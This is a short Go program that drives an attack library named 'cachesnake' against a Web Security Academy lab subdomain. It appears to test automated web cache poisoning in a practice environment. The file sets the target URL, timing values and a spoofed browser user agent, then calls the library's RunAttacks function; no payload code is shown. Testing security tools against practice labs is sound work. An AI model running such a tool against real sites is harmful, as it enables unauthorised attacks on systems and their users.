package main

import (
	"fmt"
	"time"

	"automation.com/cachesnake"
	"github.com/valyala/fasthttp"
)

func main() {
	subdomain := &cachesnake.Subdomain{
		Value:         "0a79005c03077dbc80bac1ed00250013.web-security-academy.net",
		LastRequested: time.Now(),
		CookieList:    make([]*fasthttp.Cookie, 0),
	}

	target := &cachesnake.AttackTarget{
		TargetURL:       "https://0a79005c03077dbc80bac1ed00250013.web-security-academy.net/",
		ParentSubdomain: subdomain,
	}

	result := cachesnake.RunAttacks(target, 15*time.Second, 500*time.Millisecond, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0")

	fmt.Println(result)
}
